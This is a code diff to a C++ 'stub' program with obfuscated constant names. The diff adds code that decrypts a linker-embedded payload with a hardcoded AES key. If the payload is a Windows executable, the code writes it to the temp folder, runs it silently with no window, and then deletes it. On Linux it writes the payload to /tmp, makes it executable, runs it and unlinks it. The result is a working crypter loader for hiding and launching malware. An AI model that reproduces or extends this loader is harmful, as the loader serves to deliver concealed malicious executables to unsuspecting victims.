@@ -8,6 +8,12 @@
 #include <cstdint>
 #include <random>
 #include <ctime>
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/stat.h>
+#endif
 
 // Standalone Basic Stub - Simple and clean
 const std::string KEY_AFwMQiXh = "7e1bd86b8b83cf14055b0e3d3326a55b";
@@ -142,30 +148,77 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
     }
 }
 
+// Embedded encrypted data (will be populated by linker)
+extern unsigned char embeddedData[];
+extern size_t embeddedDataSize;
+
 int main() {
-    // Standalone stub - no embedded data
-    // Standalone stub - no embedded data}
-    
     // Convert hex strings to bytes
     uint8_t key[16], nonce[16];
     hexToBytes(KEY_AFwMQiXh, key);
     hexToBytes(NONCE_upFhH5NH, nonce);
     
+    // Create a buffer for decryption
+    std::vector<uint8_t> decryptedData(embeddedDataSize);
+    std::memcpy(decryptedData.data(), embeddedData, embeddedDataSize);
+    
     // Decrypt the data using AES-128-CTR
-    // Note: embeddedData and embeddedDataSize will be added by stub linker
-    // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+    aesCtrCrypt(decryptedData.data(), decryptedData.data(), embeddedDataSize, key, nonce);
+    
+    // Generate random filename
+    std::srand(std::time(nullptr));
+    std::string filename = "output_" + std::to_string(std::rand()) + ".bin";
     
     // Write decrypted data to file
-    // Note: embeddedData and embeddedDataSize will be added by stub linker
-    // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
-    // if (outFile.is_open()) {
-    //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
+    std::ofstream outFile(filename, std::ios::binary);
+    if (outFile.is_open()) {
+        outFile.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
         outFile.close();
-        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+        
+        // Execute if it's a Windows executable
+        if (embeddedDataSize > 2 && decryptedData[0] == 'M' && decryptedData[1] == 'Z') {
+            #ifdef _WIN32
+            // Execute in memory or via temp file
+            char tempPath[MAX_PATH];
+            GetTempPath(MAX_PATH, tempPath);
+            std::string exePath = std::string(tempPath) + "\\tmp" + std::to_string(GetTickCount()) + ".exe";
+            
+            std::ofstream exeFile(exePath, std::ios::binary);
+            if (exeFile.is_open()) {
+                exeFile.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+                exeFile.close();
+                
+                // Execute the file
+                STARTUPINFO si = {0};
+                si.cb = sizeof(si);
+                PROCESS_INFORMATION pi = {0};
+                
+                if (CreateProcessA(NULL, const_cast<char*>(exePath.c_str()), NULL, NULL, FALSE, 
+                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                }
+                
+                // Clean up after a delay
+                Sleep(1000);
+                DeleteFileA(exePath.c_str());
+            }
+            #else
+            // Linux execution
+            std::string exePath = "/tmp/tmp" + std::to_string(std::rand()) + ".bin";
+            std::ofstream exeFile(exePath, std::ios::binary);
+            if (exeFile.is_open()) {
+                exeFile.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+                exeFile.close();
+                chmod(exePath.c_str(), 0755);
+                system(exePath.c_str());
+                unlink(exePath.c_str());
+            }
+            #endif
+        }
+        
+        return 0;
     } else {
-        std::cerr << "Failed to create output file" << std::endl;
         return 1;
     }
-    
-    return 0;
 }
